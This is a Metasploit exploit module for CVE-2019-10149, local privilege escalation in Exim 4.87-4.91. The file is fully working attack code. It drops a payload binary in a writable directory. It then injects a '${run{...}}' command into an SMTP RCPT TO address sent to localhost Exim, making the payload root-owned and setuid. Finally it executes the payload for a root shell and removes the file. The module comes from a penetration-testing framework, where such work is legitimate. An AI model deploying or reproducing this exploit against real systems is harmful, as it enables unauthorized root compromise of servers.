##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Exim 4.87 - 4.91 Local Privilege Escalation',
      'Description'    => %q{
        This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive).
        Improper validation of recipient address in deliver_message()
        function in /src/deliver.c may lead to remote command execution
        (CVE-2019-10149).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Qualys', # Discovery and PoC (@qualys)
          'Dennis Herrmann', # Working exploit (@dhn)
          'Marco Ivaldi', # Working exploit (@0xdea)
          'Guillaume AndrÃ©' # Metasploit module (@yaumn_)
        ],
      'DisclosureDate' => '2019-06-05',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        =>
        [
          [
            'Exim 4.87 - 4.91',
            lower_version: Gem::Version.new('4.87'),
            upper_version: Gem::Version.new('4.91')
          ]
        ],
      'DefaultOptions' =>
        {
          'PrependSetgid' => true,
          'PrependSetuid' => true
        },
      'References'     =>
        [
          [ 'CVE', '2019-10149' ],
          [ 'EDB', '46996' ],
          [ 'URL', 'https://www.openwall.com/lists/oss-security/2019/06/06/1' ]
        ]
    ))

    register_options(
      [
        OptString.new('EXIMPATH', [ false, 'The path to the exim executable (used to check for vulnerability)' ]),
        OptInt.new('EXIMPORT', [ true, 'The port exim is listening to', 25 ])
      ])

    register_advanced_options(
      [
        OptBool.new('ForceExploit', [ false, 'Override check result', false ]),
        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
      ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def encode_command(cmd)
    '\x' + cmd.unpack('H2' * cmd.length).join('\x')
  end

  def inject_payload(payload)
    if session.type == 'meterpreter'
      socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)
      params = Rex::Socket::Parameters.new({
        'PeerHost' => '127.0.0.1',
        'PeerPort' => datastore['EXIMPORT']
      })
      socket = socket_subsystem.create_tcp_client_channel(params)
      socket.gets
      socket.puts("helo localhost\n")
      socket.gets
      socket.puts("mail from:<>\n")
      socket.gets
      socket.puts("rcpt to:<${run{#{payload}}}@localhost>\n")
      socket.gets
      socket.puts("data\n")
      socket.gets
      for i in (1..31)
        socket.puts("Received: #{i}\n")
      end
      socket.puts(".\n")
      socket.gets
      socket.puts("quit\n")
      socket.close
      socket_subsystem.shutdown
    else
      res = cmd_exec("exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}")

      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "helo localhost" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "mail from:<>" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec("echo 'rcpt to:<${run{#{payload}}}@localhost>' >&3")
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "data" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      for i in (1..31)
        cmd_exec("echo 'Received: #{i}' >&3")
      end
      cmd_exec('echo "." >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "quit" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('exec 3<&-')
    end

    print_status('Payload sent, wait a few seconds...')
    Rex.sleep(5)
  end

  def on_new_session(session)
    super

    if session.type == 'meterpreter'
      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')
      session.fs.file.rm(@payload_path)
    else
      session.shell_command_token("rm -f #{@payload_path}")
    end

    print_good("Check session #{session.name}, you should have a root shell!")
  end

  def check
    exim = datastore['EXIMPATH'] ? datastore['EXIMPATH'] : 'exim'

    res = cmd_exec("#{exim} -bV")
    if res =~ /Exim version ([0-9\.]*) /i # Maybe improve the regex
      version = Gem::Version.new($1)
      vprint_status("Detected running exim version: #{version}")
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end

    print_error('Couldn\'t retrieve exim version. You may want to set EXIMPATH.')
    CheckCode::Unknown
  end

  def exploit
    if is_root?
      unless datastore['ForceExploit']
        fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
      end
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    unless datastore['PrependSetuid'] && datastore['PrependSetgid']
      fail_with(Failure::BadConfig, 'PrependSetuid and PrependSetgid must both be set to true in order ' \
                                    'to get root privileges.')
    end

    @payload_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
    write_file(@payload_path, payload.encoded_exe)
    inject_payload(encode_command("/bin/bash -c \"chown root #{@payload_path};"\
                                  "chmod 4755 #{@payload_path}\""))
    if setuid?(@payload_path)
      cmd_exec(@payload_path)

      if session_created?
        return
      end
    end

    file_rm(@payload_path)
    print_error('Couldn\'t escalate privileges')
  end
end
